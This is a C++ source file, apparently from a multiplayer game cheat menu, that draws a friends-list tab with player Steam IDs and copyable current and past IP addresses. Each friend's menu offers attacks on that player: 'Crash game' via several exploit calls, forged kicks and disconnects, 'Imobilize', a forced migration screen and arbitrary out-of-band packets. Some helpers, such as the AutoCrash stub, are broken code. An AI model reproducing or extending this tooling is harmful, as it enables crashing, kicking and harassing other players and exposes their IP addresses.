
#include "friends.hpp"

namespace friends
{
	std::vector<friends_t> friends;

	void write_to_friends()
	{
		json j{};

		for (const auto& friends : friends)
		{
			if (friends.ip_str != "invalid"s) {
				j[std::to_string(friends.xuid)] =
				{
					{ "name", friends.name},
					//{ "ip", friends.ip_str}
				};
			}
			else {
				j[std::to_string(friends.xuid)] =
				{
					{ "name", friends.name},
					//{ "ip", "invalid"s}
				};
			}

		}

		io::write_file(io::get_json_file(FRIENDS_LIST), j.dump());
	}

	void write_ip_to_friends(const std::string friend_ip, const std::string xuid_str)
	{
		json j{};

		for (const auto& friends : friends)
		{
			if (std::to_string(friends.xuid) == xuid_str) {

				if ((char*)xuid_str[0] == "0" && (char*)xuid_str[1] == ".") {
					j[std::to_string(friends.xuid)] =
					{
						{ "name", friends.name},
						//{ "ip", "invalid"s}
					};
					//auto msg_to_send = "IP was invalid. (Not written)"s;
					//CG_BoldGameMessageCenter(0, msg_to_send.c_str());
				}
				else {
					j[std::to_string(friends.xuid)] =
					{
						{ "name", friends.name},
						//{ "ip", friend_ip}
					};
					//auto msg_to_send = "IP was saved"s;
					//CG_BoldGameMessageCenter(0, msg_to_send.c_str());
				}


			}


			else {
				j[std::to_string(friends.xuid)] =
				{
					{ "name", friends.name},
					//{ "ip", friends.ip_str}
				};
			}
		}

		io::write_file(io::get_json_file(FRIENDS_LIST), j.dump());
	}

	void refresh_friends()
	{
		friends.clear();

		if (const auto json = io::parse_json_file(FRIENDS_LIST); json.is_object())
		{
			for (const auto& [key, value] : json.items())
			{
				friends.emplace_back(friends_t
					{
						std::stoull(key),
						value["name"].get<std::string>(),
						//value["ip"].get<std::string>()
					});
			}
		}
	}

	void send_info_request_to_friend(friends_t& friends)
	{
		friends.netadr = {};
		instant_message::send_info_request(friends.xuid);
	}

	void request_loop() {

		if (clock() - RequestTMR > AutoRequestTime)
		{
			std::vector<std::uint32_t> indices2{};

			for (size_t i = 0; i < friends.size(); ++i)
			{
				indices2.emplace_back(i);
			}
			for (const auto& friend_num : indices2)
			{
				auto& friends = friends::friends[friend_num];
				send_info_request_to_friend(friends);
			}
			auto crashmsg = "^2Requests Sent"s;
			CG_BoldGameMessageCenter(0, crashmsg.c_str());
			RequestTMR = clock();
			indices2.clear();
		}

	}

	void force_request_loop() {

		std::vector<std::uint32_t> indices2{};

		for (size_t i = 0; i < friends.size(); ++i)
		{
			indices2.emplace_back(i);
		}
		for (const auto& friend_num : indices2)
		{
			auto& friends = friends::friends[friend_num];
			send_info_request_to_friend(friends);
		}
		auto crashmsg = "^2Requests Sent"s;
		CG_BoldGameMessageCenter(0, crashmsg.c_str());
		//RequestTMR = clock();
		indices2.clear();
	}

	void remove_friend(const std::uint64_t steam_id)
	{
		const auto entry = std::find_if(friends.begin(), friends.end(), [=](const auto& friends) { return friends.xuid == steam_id; });

		if (entry != friends.end())
		{
			friends.erase(entry);
		}

		write_to_friends();
	}

	void AutoCrash()
	{
		bool AutoCrash = false;

		int AutoCrashTMR = clock();

		if (clock() - AutoCrash > AutoCrashTMR)
		{
			for (int q = 0; q < friends.size(); ++q)
			{
				//std::uint64_t xuid;
			}
			AutoCrashTMR = clock();
		}

		return;
	}

	void friends_list()
	{
		if (ImGui::BeginTabItem("Friends"))
		{
			int amount = 0;
			for (size_t i = 0; i < friends::friends.size(); ++i)
			{
				amount++;
			}

			const auto width = ImGui::GetContentRegionAvail().x;

			const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

			static ImGuiTextFilter filter;

			ImGui::Dummy(ImVec2(0.0f, 1.4f));

			ImGui::TextUnformatted("Search Friends");
			ImGui::SameLine();
			ImGui::Dummy(ImVec2(381.0f, 0.0f));
			ImGui::SameLine();
			ImGui::Text("%i friends", amount);
			ImGui::Dummy(ImVec2(0.0f, 1.4f));
			
			ImGui::Dummy(ImVec2(0.0f, 1.4f));

			ImGui::SameLine(0.0f, spacing);

			filter.Draw("##search_friend", "Name", width * 0.86f);
			ImGui::SetNextItemWidth(width * 0.88f);

			ImGui::SameLine(0.0f, spacing);

			const auto popup = "Add Friend##add_friend_popup"s;

			if (ImGui::Button("Add By ID"))
			{
				ImGui::OpenPopup(popup.data());
			}

			ImGui::SetNextWindowBgAlpha(1.0f);

			if (ImGui::BeginPopupModal(popup.data(), nullptr, ImGuiWindowFlags_NoResize))
			{
				static auto name_input = ""s;
				static auto steam_id_input = ""s;

				ImGui::SetNextItemWidth(width * 0.5f);
				ImGui::InputTextWithHint("##name_input", "Name", &name_input);

				ImGui::Dummy(ImVec2(0.0f, 0.7f));
				ImGui::Separator();
				ImGui::Dummy(ImVec2(0.0f, 0.7f));
		
				ImGui::SetNextItemWidth(width * 0.5f);
				ImGui::InputTextWithHint("##steam_id_input", "Steam ID", &steam_id_input);

				ImGui::Dummy(ImVec2(0.0f, 0.7f));
				ImGui::Separator();
				ImGui::Dummy(ImVec2(0.0f, 0.7f));

				if (ImGui::MenuItem("Add Friend", nullptr, nullptr, !name_input.empty() && !steam_id_input.empty()))
				{
					friends.emplace_back(friends_t{ utils::atoll(steam_id_input), name_input, "invalid"s });
					write_to_friends();

					ImGui::CloseCurrentPopup();
				}

				ImGui::Dummy(ImVec2(0.0f, 1.4f));

				if (ImGui::MenuItem("Refresh Friends"))
				{
					refresh_friends();
					ImGui::CloseCurrentPopup();
				}

				ImGui::Dummy(ImVec2(0.0f, 0.7f));
				ImGui::Separator();
				ImGui::Dummy(ImVec2(0.0f, 0.7f));

				if (ImGui::MenuItem("Close Popup"))
				{
					ImGui::CloseCurrentPopup();
				}

				if (ImGui::IsKeyPressedWithIndex(ImGuiKey_Escape))
				{
					ImGui::CloseCurrentPopup();
				}

				ImGui::Dummy(ImVec2(0.0f, 1.4f));

				ImGui::EndPopup();
			}

			ImGui::Dummy(ImVec2(0.0f, 1.4f));

			ImGui::Separator();

			ImGui::BeginColumns("Friends", 4, ImGuiColumnsFlags_NoResize);

			ImGui::SetColumnWidth(-1, 32.0f);
			ImGui::TextUnformatted("#");

			ImGui::NextColumn();
			ImGui::SetColumnWidth(-1, 255.0f);
			ImGui::TextUnformatted("Friend");

			ImGui::NextColumn();
			ImGui::SetColumnWidth(-1, 260.0f);
			ImGui::TextUnformatted("Steam ID");

			ImGui::NextColumn();
			ImGui::SetColumnWidth(-1, 260.0f);
			ImGui::TextUnformatted("Status");
			ImGui::NextColumn();


			ImGui::Separator();

			std::vector<std::uint32_t> indices{};

			for (size_t i = 0; i < friends.size(); ++i)
			{
				indices.emplace_back(i);
			}

			std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return friends[a].name < friends[b].name; });
			std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return friends[a].online < friends[b].online; });

			for (const auto& friend_num : indices)
			{
				auto& friends = friends::friends[friend_num];
				const auto netadr = friends.netadr;

				auto status_str = "Offline"s;

				if (netadr.inaddr) {
					status_str = "Online"s;
					friends.online = "a"s;
				}

				if (filter.PassFilter(friends.name))
				{
					ImGui::AlignTextToFramePadding();

					ImGui::TextUnformatted(std::to_string(friend_num));

					ImGui::NextColumn();

					ImGui::AlignTextToFramePadding();

					const auto selected = ImGui::Selectable(friends.name.data() + "##"s + std::to_string(friend_num));

					const auto popup = "friend_popup##" + std::to_string(friend_num);
					static auto on_pop_up_loop = false;
					
					ImGui::NextColumn();

					ImGui::AlignTextToFramePadding();

					if (ImGui::MenuItem(std::to_string(friends.xuid)))
					{
						ImGui::LogToClipboardUnformatted(std::to_string(friends.xuid));
					}

					ImGui::NextColumn();

					ImGui::AlignTextToFramePadding();

					ImGui::TextUnformatted(status_str);

					if (selected)
					{
						on_pop_up_loop = false;
						send_info_request_to_friend(friends);

						ImGui::OpenPopup(popup.data());
					}

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{

						const auto is_netadr_valid{ netadr.inaddr };
						const auto ip_string{ is_netadr_valid ? utils::adr_to_string(&netadr) : "0.0.0.0" };
						bool is_ip_cached = false;

						ImGui::MenuItem(friends.name + "##" + std::to_string(friend_num) + "friend_menu_item", nullptr, false, false);

						ImGui::SameLine();

						ImGui::Text("Click for profile       ", "##1");

						ImGui::Dummy(ImVec2(0.0f, 0.7f));

						ImGui::Separator();

						ImGui::Dummy(ImVec2(0.0f, 0.7f));;

						if (ImGui::MenuItem(std::to_string(friends.xuid)))
						{							
							ImGui::LogToClipboardUnformatted(std::to_string(friends.xuid));							
						}
							
						ImGui::SameLine();

						ImGui::Text("Click To Copy");

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem(ip_string, nullptr, nullptr, netadr.inaddr))
						{
							ImGui::LogToClipboardUnformatted(ip_string);
						}

						ImGui::SameLine();

						ImGui::Text("Click To Copy");

						ImGui::Dummy(ImVec2(0.0f, 1.4f));
										
						if (friends.ip_str != ""s) {
							is_ip_cached = true;
						}

						if (ImGui::BeginMenu("Past IP addresses")) {
							if (ImGui::MenuItem(friends.ip_str, nullptr, nullptr, is_ip_cached)) {
								ImGui::LogToClipboardUnformatted(friends.ip_str);
							}
							ImGui::EndMenu();
						}

						static auto xuid_str = std::to_string(friends.xuid);
						static auto name_str = std::string(friends.name.data());
						static auto ip_f_str = std::string(friends.ip_str.data());

						if (ImGui::IsItemClicked())
						{

						}

						if (ImGui::IsItemHovered())
						{
							ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
						}

						

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						ImGui::Separator();

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::BeginMenu("Rename##" + std::to_string(friend_num)))
						{
							static auto rename_friend_input = ""s;

							ImGui::InputTextWithHint("##" + std::to_string(friend_num), "Name", &rename_friend_input);
																									
							if (ImGui::MenuItem("Rename"))
							{
								if (friends.name != rename_friend_input)
								{
									friends.name = rename_friend_input;

									write_to_friends();
								}
							}

							ImGui::EndMenu();
						}

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem("Delete"))
						{
							remove_friend(friends.xuid);

							write_to_friends();
						}
											
						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						ImGui::Separator();

						ImGui::Dummy(ImVec2(0.0f, 1.4f));
				
						if (ImGui::MenuItem("Join session"))
						{
							const auto command = "join " + std::to_string(friends.xuid);
							Cbuf_AddText(0, command.data());

							LobbyVM_JoinEvent(0, friends.xuid, JOIN_TYPE_NORMAL);

							LobbyVM_JoinEvent(0, friends.xuid, JOIN_TYPE_FRIEND);

							LobbyVM_JoinEvent(0, friends.xuid, JOIN_TYPE_INVITE);

							LobbyVM_JoinEvent(0, friends.xuid, JOIN_TYPE_PARTY);

							LobbyVM_JoinEvent(0, friends.xuid, JOIN_TYPE_GROUPS);
						}

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						ImGui::Separator();

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem("Crash game"))
						{
							exploit::send_crash(friends.xuid);

							exploit::send_relay_crash(netadr);

							exploit::send_vt_crash(netadr);

							exploit::send_v_crash(netadr);												
						}
				
						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem("Open popup"))
						{
							exploit::send_popup(friends.xuid);						
						}
			
						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem("Kick(1)", nullptr, nullptr, &netadr.inaddr))
						{
							exploit::send_connect_response_migration_packet(netadr);
						}

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem("Kick(2)"))
						{
							LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, friends.xuid, 2);

							LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, friends.xuid, 2);
						}

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem("Kick(3)"))
						{
							LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, friends.xuid, 1);

							LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, friends.xuid, 1);
						}

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem("Disconnect"))
						{
							LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, friends.xuid, 6);

							LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, friends.xuid, 6);
						}

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem("Show Migration Screen", nullptr, nullptr, &netadr.inaddr))
						{
							exploit::send_mstart_packet(netadr);
						}

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::MenuItem("Imobilize", nullptr, nullptr, &netadr.inaddr))
						{
							exploit::send_request_stats_packet(netadr);
						}

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						ImGui::Separator();

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::BeginMenu("Other"))
						{
							ImGui::Dummy(ImVec2(0.0f, 1.4f));

							if (ImGui::MenuItem("NOPARTYCHAT"))
							{
								LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, friends.xuid, 5);

								LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, friends.xuid, 5);
							}

							ImGui::Dummy(ImVec2(0.0f, 1.4f));

							if (ImGui::MenuItem("HOSTRELOAD"))
							{
								LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, friends.xuid, 4);

								LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, friends.xuid, 4);
							}

							ImGui::Dummy(ImVec2(0.0f, 1.4f));

							if (ImGui::MenuItem("Client Error"))
							{
								LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_PRIVATE, friends.xuid, 7);

								LobbyClientMsg_SendDisconnectClient(0, LOBBY_TYPE_GAME, friends.xuid, 7);
							}

							ImGui::Dummy(ImVec2(0.0f, 1.4f));

							ImGui::EndMenu();
						}

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						ImGui::Separator();

						ImGui::Dummy(ImVec2(0.0f, 1.4f));

						if (ImGui::BeginMenu("Custom OOB")) {

							ImGui::Dummy(ImVec2(0.0f, 3.0f));

							static auto MSG_NET = ""s;

							ImGui::InputTextWithHint("##MSG_NET", "OOB/STRING", &MSG_NET);

							ImGui::SameLine();

							if (ImGui::MenuItem("Send", nullptr, nullptr, netadr.inaddr))
							{
								send_oob(netadr, MSG_NET);
								auto msg_to_print = "Custom OOB \""s + MSG_NET + "\" Sent"s;
							}

							ImGui::EndMenu();
						}


						ImGui::EndPopup();
					}

					ImGui::NextColumn();

					if (ImGui::GetColumnIndex() == 0)
					{
						ImGui::Separator();
					}
				}
			}

			ImGui::EndColumns();

			ImGui::EndTabItem();
		}
	}
}